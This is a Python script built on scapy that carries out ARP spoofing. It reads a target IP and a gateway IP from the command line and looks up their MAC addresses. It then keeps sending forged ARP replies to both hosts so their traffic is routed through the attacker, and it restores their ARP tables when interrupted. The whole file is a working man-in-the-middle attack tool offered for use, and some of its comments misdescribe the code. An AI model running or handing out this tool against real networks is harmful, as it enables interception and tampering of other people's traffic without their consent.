import scapy.all as scapy
import time
import optparse

def get_input():
    parse_obj = optparse.OptionParser()
    parse_obj.add_option("-t","--target", dest="target_ip",help="Enter target IP")
    parse_obj.add_option("-g","--gateway",dest="gateway_ip",help="Enter gateway IP")    
    options = parse_obj.parse_args()[0]
    if not options.target_ip:
        print("Enter target IP")
    if not options.gateway_ip:
        print("Enter gateway IP")
    return options
    
def get_mac(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    # creating a arp request for ip ranges 
    # 0/24 specifies all 255 ip's
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # creating a packet for broadcast mac ranges 
    # ff specifies max thus all the mac addresses
    combined_packet = broadcast_packet/arp_request_packet
    # combining two packets using scapyies / method
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    # broadcast to all combined packets of mac and ip addresses 
    if answered_list:
        # If there are answered packets
        return answered_list[0][1].hwsrc
        # Return the MAC address from the first answered packet
    else:
        print("[-] Could not get MAC address for", ip)
        return None
    

def arp_poisoning(target_ip,poison_ip):
    target_mac = get_mac(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poison_ip)
    scapy.send(arp_response,verbose=False)
    
def reset_op(fooled_ip,gateway_ip):
    
    fooled_mac = get_mac(fooled_ip)
    gateway_mac = get_mac(gateway_ip)
    
    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=6)
    
user_ips = get_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip    

number = 0

try:
    while True: 
        arp_poisoning(user_target_ip,user_gateway_ip)
        arp_poisoning(user_gateway_ip,user_target_ip)
        
        number += 2
        print(f"\r{str(number)} Packets sent",end="\t")
        
        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_op(user_target_ip,user_gateway_ip)
    reset_op(user_gateway_ip,user_target_ip)